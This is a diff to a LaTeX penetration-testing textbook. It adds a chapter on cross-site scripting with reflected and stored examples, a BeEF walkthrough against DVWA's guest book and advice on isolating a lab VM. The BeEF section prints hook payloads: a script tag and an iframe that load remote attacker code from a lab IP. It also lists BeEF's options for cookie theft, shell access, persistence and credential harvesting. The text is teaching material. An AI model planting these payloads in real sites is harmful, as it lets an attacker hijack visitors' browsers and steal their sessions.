@@ -356,7 +356,7 @@
 	\label{ch:ScopingMindset}
 		No matter how good one gets at the technical aspects of hacking, they will never be good at it if they do not understand how to think about their target and attack. 
 		One must understand the difference between attempting to beat down a stone wall with a battering ram and simply finding the key. 
-		In a world where the tools to run an attack are easy and often have a GUI with a big red ``hack the target'' button, such as Armitage's ``hail mary'' feature, 
+		In a world where the tools to run an attack are easy and often have a GUI with a big red ``hack the target'' button, such as Armitage's ``hail Mary'' feature, 
 		we often forget to work out what our client is. 
 		This section will have you step back, away from the keyboard and look at what is happening. 
 		We will start with lock picking, as it is \emph{the} past time of hackers. 
@@ -871,6 +871,8 @@
 			While this is useful, it does require access to the hard drive. 
 			This makes it risky, in that if you are found, evidence of your attack will be left on the system. 
 	\section{Challenges}
+	% TODO: https://www.vulnhub.com/
+	% 
 		\subsection{Unsecured FTP to Shell}
 		% Expect tutorial for setting this up. http://web.archive.org/web/20041010121409/http://www.raycosoft.com/rayco/support/expect_tutor.html
 			This section is an initial walk through for getting access to a system with an unsecured FTP server. 
@@ -928,6 +930,79 @@
 \chapter{Web Penetration}
 	\label{ch:WebPenetration}
 	\section{XSS}
+		XSS is one of the main attack vectors for modern viruses and attacks. 
+		It is commonly used as the first access to the system, delivering a more stable connection to the system later. 
+		XSS will allow you to gain preliminary access to the system, creating a vector for your control of it. 
+		Furthermore, with a tool such a BeEF, you are able to control a significant amount of the victims computer purely through XSS. 
+		XSS will allow you to inject malicious code into an otherwise trusted website, making it exceptionally powerful. 
+		This occurs because a browser has no way to know that a script should not be trusted and thus will generally always run them. 
+		This script can then access any cookies, session data or other sensitive data stored within the browser. 
+		A good hook could even give access to the whole system. 
+		XSS comes in two forms, reflected and stored. 
+		We will be discussing both in depth. 
+		\subsection{Reflected}
+			This type of attack is easier to pull off but often easier to spot. 
+			The attacker will send a link to a vulnerable website with a script within it. 
+			The website will then echo back the script, having the users browser run it. 
+			This script will then open a connection to another site, which will host the hook. 
+
+			An example of this is the following URL:
+			\begin{quote}
+				https://example.com/page?var=<script>alert('xss')</script>
+			\end{quote}
+
+			The issue with this type of attack is that it requires that you can get the victim to click on the link.
+			This is also the main reason it is recommended that you check links before clicking them.
+		\subsection{Stored}
+			Stored XSS works by finding a website that will retain your script for you and run it every time someone accesses the page. 
+			Usually, these are found in comment or post boxes, but they can be anywhere that the user can input text which will be displayed for another user. 
+			The benefit to these pages is that the link you send to them will not look dodgy and the script will hook anyone who attempts to access the page. 
+		\subsection{BeEF}
+			BeEF is the tool that makes this these attacks interesting. 	
+			While previously, you could run arbitrary code on the remote computer, now you can run dynamic code. 
+			The former is more powerful if you know how to write code, but BeEF will give you mostly the same outcome with far less work. 
+			Similarly, like all good Linux tools, BeEF comes with both a CLI and GUI version. 
+			We will be working with the GUI, as it does most of what we need to do. 
+			However, the CLI version is significantly more powerful and adaptable. 
+
+			\subsubsection{Hooking}
+				Before you can do anything with BeEF, you will have to hook a browser. 
+				To do this, you will first have to find a vulnerable page such as the guest book on DVWA. 
+				At this point, you will want to embed the BeEF hook script into the page with a command such as the following:
+				\begin{verbatim}
+					<script src= “http://192.168.31.20:3000/hook.js&#8221;  
+type= "text/javascript" ></script>
+					or
+					<iframe height=0 width=0 
+src=http://192.168.31.21:3000/demos/basic.html></iframe>
+				\end{verbatim}
+				If you set this up correctly, the victim will have to do nothing more than access the page to be hooked. 
+				No clicking or other intervention is required. 
+			\subsubsection{Attacking}
+				Once your hook is set, you should see an IP address under ``Online Browsers'' in the BeEF UI. 
+				You can then select this IP for more information and attacks. 
+				
+				Under the details tab you will see the details of the browser and OS. 
+				This can be useful for working out what attacks might work and determining what kind of user you are working with. 
+
+				Under the commands tab, you will see a list of folders. 
+				Each of these folders contains a number of commands which can be run on the remote computer. 
+				\begin{description}
+					\item[Browser] Information and attacks on the browser directly. 
+						These can be used to get session cookies and other information. 
+					\item[Chrome Extensions] Chrome specific attacks. 
+					\item[Exploits] Direct browser or OS exploits. 
+					\item[Host] Information gathering on the host machine. 
+						This can be used to get items such as registry keys on a windows system. 
+					\item[IPEC] Can be used to get shell access to the machine. 
+					\item[Network] Network scanning and pivoting operations. 
+					\item[Persistance] Retain access to the BeEF hook. 
+					\item[Social Engineering] Attempt to convince the user that you are legit. 
+						Gather user names and passwords for use on a specific site. 
+				\end{description}
+
+				Furthermore, BeEF can be connected to Metasploit to gain access to a Meterpreter shell. 
+				This shell will give you persistence options as well as the ability to control the whole system. 
 	\section{SQL Injection}
 	\section{File Uploads}
 \chapter{Forensics}
@@ -1939,6 +2014,33 @@ alias ls="ls --color=auto"
 				you cannot attack the wrong target, but without them, 
 				a single mistype and you could be attacking a completely different target. 
 				
+				To Set up a VM correctly, the following items must be set. 
+				Where a setting can be relaxed, it has been noted, along with when. 
+				\begin{itemize}
+					\item Shared Folders should be disabled unless to send a specific file. 
+						Generally, this is not useful and provides a good way to get access to the host. 
+					\item Processors: Generally as many cores as possible. However, 2 should suffice, 4 is the minimum for good performance. 
+					\item Memory: Should be set to minimum 4GB. 
+					\item Display: Turn on accelerated graphics and pass through memory. 
+					\item Network:
+						\begin{itemize}
+							\item When working the VM should be set to a custom host only network. 
+							\item This will stop any traffic getting out of your lab, as well as helping to stop any malicious traffic reaching the host. 
+							\item Between practices, such as when updating tools, NAT will allow you to connect to the internet. 
+							\item However, \emph{do not forget to reset to host only} after updating. 
+							\item No matter the setup, you will likely want to set ``Use Local DHCP Service'' to enable you to get an IP address rather than setting them all manually. 
+							\item When dealing with software that you do not trust, you should also uncheck the ``Connect a host virtual adaptor to this network'' so that the software cannot access the physical host over the network. 
+						\end{itemize}
+					\item Hard disk: Usually 20GB is fine for basic Linux installs. 
+						Windows usually requires more. 
+					\item USB: Ensure that you have a USB controller connected. 
+						This is your easiest way to get hardware level access. 
+					\item Unless you have a server, set compatibility level to 12. 
+					\item Isolation: When working, disable both copy and paste and drag and drop. 
+						When updating or setting up, feel free to enable them. 
+						This is to protect the host system, not to stop attacks leaking. 
+					\item Ensure that VNC and other remote connections are disabled. 
+				\end{itemize}
 
 			
 \chapter{Cryptography}
